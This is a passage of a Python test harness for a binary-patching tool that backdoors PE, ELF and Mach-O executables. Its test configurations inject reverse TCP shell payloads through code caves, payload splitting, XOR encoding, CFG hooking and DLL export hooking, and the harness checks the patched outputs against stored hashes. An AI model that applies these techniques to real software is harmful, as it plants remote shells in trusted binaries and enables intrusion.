                  "TESTING_CAVES": "21,179,52,103",
                  "CHECKSUM": True} |
                 meth_modes["jmp_txt_ldr_payload_splitting"] |
                 payloads["txt_ldr_rvrs_tcp_stgd_thrdd"] |
                 parameters["mnl_xor_encoder_connect_back"],
                 "cdbb63f4376891b283f2cb19f33d1c1abd19563a34bc0baefc383a1b4a7178cc",
                 "txt_loader_rvrs_threaded payload_splitting xor_encoder jmp_entry"],

          '25': [{"ZERO_CERT": True,
                  "NUMBER_OF_CAVES": 2,
                  "TESTING_CAVES": "1,14",
                  "CHECKSUM": True,
                  "SUPPLIED_SHELLCODE":
                  "./tests/localhost_8080_x64_reverse_shell_tcp.bin"} |
                 meth_modes["jmp_txt_ldr_payload_splitting"] |
                 payloads["txt_usr_sppld_shllcd_thrdd"] |
                 parameters["mnl_usr_suppld_xor_encoder_lclhst"],
                 "bbf9e7bb4b051bffd29b0d25fe74e63e7f3580a774de82a793f9ed2e38f65a23",
                 "txt_loader_usr_suppld payload_splitting xor_encoder jmp_entry"],

          '26': [{"ZERO_CERT": True,
                  "NUMBER_OF_CAVES": 2,
                  "TESTING_CAVES": "4,17",
                  "CHECKSUM": True} |
                 meth_modes["cfg_txt_ldr_payload_splitting"] |
                 payloads["txt_ldr_rvrs_tcp_stgd_thrdd"] |
                 parameters["mnl_xor_encoder_connect_back"],
                 "f8c8cef03e47c672a0cbb27f787a4df641ae2b303f1edfef6d71e1c13af61430",
                 "txt_loader_rvrs_threaded payload_splitting xor_encoder hook_cfg"],

          '27': [{"ZERO_CERT": True,
                  "NUMBER_OF_CAVES": 2,
                  "TESTING_CAVES": "25,18",
                  "CHECKSUM": True,
                  "SUPPLIED_SHELLCODE":
                  "./tests/localhost_8080_x64_reverse_shell_tcp.bin"} |
                 meth_modes["cfg_txt_ldr_payload_splitting"] |
                 payloads["txt_usr_sppld_shllcd_thrdd"] |
                 parameters["mnl_usr_suppld_no_encdr_no_chng_accss_lclhst"],
                 "48ada9cc7d866fb9930fd78cb33d8d18df3721da46f8b0fe7bb9e743fa4f7f2b",
                 "txt_loader_usr_suppld payload_splitting hook_cfg"],

          }
         ],
    40: ["hello-world.dll", "./tests/",
         "5cb4be3346d9ded95e16e659e96ced38a4e913b43e01adaf777da4914ef27f9f",
         """ """, "pe",
         {'1': [{"ZERO_CERT": True,
                 "TESTING_CAVES": "3",
                 "CHECKSUM": True,
                 "EXPORTS": "MessageBoxThread1,MessageBoxThread2",
                 } |
                meth_modes['dll_txt_ldr_sngl_cve'] |
                payloads['txt_ldr_dll_rvrs_tcp_stgd_thrdd'] |
                parameters['mnl_no_encoder_no_chng_accss'],
                "8124513b62c10f4720a790c6f87c146212e0b24bf85d308a629acdf5961d4a28",
                "Dll patching selected exports apis in a DLL"],
          '2': [{"ZERO_CERT": True,
                "SUPPLIED_SHELLCODE":
                 "tests/localhost_8080_x64_reverse_shell_tcp.bin",
                 "TESTING_CAVES": "3",
                 "CHECKSUM": True,
                 "EXPORTS": "MessageBoxThread1,MessageBoxThread2",
                 } |
                meth_modes['dll_txt_ldr_sngl_cve'] |
                payloads['txt_ldr_dll_usr_sppld_shllcd_thrdd'] |
                parameters['mnl_no_encoder_no_chng_accss'],
                "4f3e9723dc05ed796b82a1b7ca2850b3f1cbaae0ba31926e90845b54607fb40e",
                "Dll patching selected exports usr suppled shellcode"],
          '3': [{"ZERO_CERT": True,
                "SUPPLIED_SHELLCODE":
                 "tests/localhost_8080_x64_reverse_shell_tcp.bin",
                 "TESTING_CAVES": "3",
                 "CHECKSUM": True,
                 "EXPORTS": "all",
                 } |
                meth_modes['dll_txt_ldr_sngl_cve'] |
                payloads['txt_ldr_dll_usr_sppld_shllcd_thrdd'] |
                parameters['mnl_no_encoder_no_chng_accss'],
                "4f3e9723dc05ed796b82a1b7ca2850b3f1cbaae0ba31926e90845b54607fb40e",
                "Dll patching all exports usr suppled shellcode"],
                # DLL export new section
          '4': [{"ZERO_CERT": True,
                 "CHECKSUM": True,
                 "EXPORTS": "MessageBoxThread1,MessageBoxThread2",
                 } |
                meth_modes['dll_txt_ldr_add_section'] |
                payloads['txt_ldr_dll_rvrs_tcp_stgd_thrdd'] |
                parameters['mnl_no_encoder_no_chng_accss'],
                "105b8eddd3b19d1c99695e99d70f638851516de9f716f39b9b6772bab81fff92",
                "Dll patching selected exports apis in a DLL in a new section"],
                # DLL export payload splitting
          '5': [{"ZERO_CERT": True,
                "SUPPLIED_SHELLCODE":
                 "tests/localhost_8080_x64_reverse_shell_tcp.bin",
                 "TESTING_CAVES": "5,7,6",
                 "CHECKSUM": True,
                 "EXPORTS": "MessageBoxThread1,MessageBoxThread2",
                 } |
                meth_modes['dll_txt_ldr_sngl_cve'] |
                payloads['txt_ldr_dll_usr_sppld_shllcd_thrdd'] |
                parameters['mnl_no_encoder_no_chng_accss'],
                "b3a52702bb3edb9a8062bbecabd3879f2f1c3d9048932d2aac50a3369d362486",
                "Dll patching selected exports usr suppled shellcode, splitting the payload"],
          }
         ],

    41: ["FileSyncViews.dll", "./tests/",
         "23c71ccde8c89ac62d7472ee618a7d2767e042c5f8709d95a60ebc002aa04991",
         """ """, "pe",
         {'1': [{"ZERO_CERT": True,
                "SUPPLIED_SHELLCODE":
                 "tests/localhost_8080_x64_reverse_shell_tcp.bin",
                 "TESTING_CAVES": "2",
                 "CHECKSUM": True,
                 "EXPORTS": "all",
                 } |
                meth_modes['cfg_dll_txt_ldr_sngl_cve'] |
                payloads['txt_ldr_dll_usr_sppld_shllcd_thrdd'] |
                parameters['mnl_no_encoder_no_chng_accss'],
                "67f428c989cb4920f8b42be53293281cfa90c6600588d722aa5f0bfc93312874",
                "Dll patching via CFG hooking usr suppled shellcode, single"],
            # DLL CFG payload splitting
          '2': [{"ZERO_CERT": True,
                "SUPPLIED_SHELLCODE":
                 "tests/localhost_8080_x64_reverse_shell_tcp.bin",
                 "TESTING_CAVES": "8,7,9",
                 "CHECKSUM": True,
                 } |
                meth_modes['cfg_dll_txt_ldr_payload_splitting'] |
                payloads['txt_ldr_dll_usr_sppld_shllcd_thrdd'] |
                parameters['mnl_no_encoder_no_chng_accss'],
                "cddfadd77bbb3808bae98be7278f69ae581395d066700318ac2bd1eb2dcce99d",
                "Dll patching via CFG hooking payload splitting usr suppled shellcode"],
                # DLL CFG NEW Section
          '3': [{"ZERO_CERT": True,
                 "CHECKSUM": True,
                 } |
                meth_modes['cfg_dll_txt_ldr_add_section'] |
                payloads['txt_ldr_dll_rvrs_tcp_stgd_thrdd'] |
                parameters['mnl_no_encoder_no_chng_accss'],
                "10c377ba2ae3ddcec909453e3ec68758c9ff00b59d4ba74067063e2212a7d96a",
                "Dll patching via CFG Hooking in a new section"],

          }
         ],

    50: ["ubuntu_ls_x64_ET_DYN", "./tests/",
         "1e39354a6e481dac48375bfebb126fd96aed4e23bab3c53ed6ecf1c5e4d5736d",
         """ET DYN""", "elf",
         {1: [payloads["frk_rvrs_shll_tcp"] |
              meth_modes["txt_off_ntr_splttng"] |
              parameters["no_encoder_lclhst"],
              "80ccfabda98d7b995e6794c7d05b88be03d3ba9c9fa6906ec8f20af6a5ec2664",
              "fork_reverse_shell_tcp"],
          }],

    52: ["x86_64_app", "./tests/",
         "499996a8f10ae9730bf94bc9484281ad235f53e85ca3a9a9b03714be8af3fa28",
         """later""", "macho",
         {}],
    }


def output_tests(testing):
    # create directory for tests
    try:
        os.mkdir('test_cases')
    except Exception as e:
        pass

    for testcaseNumber, test in test_subjects.items():
        # ===> TODO check hash of incoming subject
        FILE = test[1] + test[0]
        logger.info(f'Testing: {FILE}')

        if test[2] != hashit('sha256', io.BytesIO(open(FILE, 'r+b').read())):
            logger.warning(f'test file changed! Aborting test: {FILE}')
            continue
        else:
            logger.info(f'Input file hash verified, continuing: {FILE}')

        if test[5] != {}:
            cases = test[5]
            for sub_test, test_list in cases.items():
                test_result = None
                test_args = test_list[0]
                hash_result = test_list[1]
                test_name = test_list[2]
                test_args['FILE'] = FILE
                test_args['b_FILE'] = io.BytesIO(open(FILE, 'r+b').read())
                if test[4] == 'pe' and ('pe' in testing or 'all' in testing):
                    print("*" * 50)
                    logger.info("*" * 50)

                    print(test_args, test_name)

                    test_result = pebin(test_args)
                if test[4] == 'macho' and ('macho' in testing or 'all' in testing):
                    print("*" * 50)
                    logger.info("*" * 50)

                    print(test_args, test_name)
                    test_result = machobin(test_args)

                if test[4] == 'elf' and ('elf' in testing or 'all' in testing):
                    print("*" * 50)
                    logger.info("*" * 50)

                    print(test_args, test_name)
                    test_result = elfbin(test_args)

                if test_result:
                    if test_result.result:
                        test_name = str(testcaseNumber) + '_' + \
                                    str(sub_test) + '_' + \
                                    hashit('sha256', test_result.result) + \
                                    '_' + test[0]
                        logger.info(f"Test Made=>{test_name}")
                        with open("test_cases/" + test_name, 'wb') as f:
                            f.write(test_result.result.read())
                    else:
                        logger.warning(f'check your test case!!=>{test_name}')


def run_tests(testing):
    failed_tests = []
    passed_tests = []
    for testcaseNumber, test in test_subjects.items():
        FILE = test[1] + test[0]
        logger.info(f'Testing: {FILE}')

        if test[2] != hashit('sha256', io.BytesIO(open(FILE, 'r+b').read())):
            logger.warning(f'test file changed! Aborting test: {FILE}')
            continue
        else:
            logger.info(f'Input file hash verified, continuing: {FILE}')

        FILE = test[1] + test[0]
        if test[5] != {}:
            cases = test[5]
            for sub_test, test_list in cases.items():
                test_result = None
                test_args = test_list[0]
                hash_result = test_list[1]
                test_name = test_list[2]
                test_args['FILE'] = FILE
                test_args['b_FILE'] = io.BytesIO(open(FILE, 'r+b').read())
                test_name_number = test[0] + '_' + str(sub_test)
                if test[4] == 'pe' and ('pe' in testing or 'all' in testing):
                    print("*" * 50)
                    logger.info("*" * 50)

                    print(test_args, test_name)
                    test_result = pebin(test_args)

                if test[4] == 'macho' and ('macho' in testing or 'all' in testing):
                    print("*" * 50)
                    logger.info("*" * 50)

                    print(test_args, test_name)
                    test_result = machobin(test_args)

                if test[4] == 'elf' and ('elf' in testing or 'all' in testing):
                    print("*" * 50)
                    logger.info("*" * 50)

                    print(test_args, test_name)
                    test_result = elfbin(test_args)

                if test_result:
                    if test_result.result:
                        if hashit('sha256', test_result.result) == hash_result:
                            logger.info(f"Test Success,{test_name}, {test_name_number}")
                            passed_tests.append(f'{test_name}:{test_name_number}')
                        else:
                            logger.warning(f"Test Fail,{test_name}, {test_name_number}")
                            failed_tests.append(f'{test_name}:{test_name_number}')
                    else:
                        logger.warning(f"Test Fail,{test_name}, {test_name_number}")
                        failed_tests.append(f'{test_name}:{test_name_number}')

    # testing report
    logger.info(f'You have {len(failed_tests)} failed tests!')
    for atest in failed_tests:
        logger.warning(f'Failed test,{atest}')
    logger.info(f'You have {len(passed_tests)} passed tests!')


def main(which_one, formats):
    if formats.lower() == 'pe':
        testing = 'pe'
    elif formats.lower() == 'macho':
        testing = 'macho'
    elif formats.lower() == 'elf':
        testing = 'elf'
    else:
        testing = 'all'

    if 'output' in which_one:
        print('producing output to test')
        output_tests(testing)
    elif 'test' in which_one:
        print('running tests')
        run_tests(testing)
        # pebin(test[6])

if __name__ == "__main__":
    main(sys.argv[1], sys.argv[2])
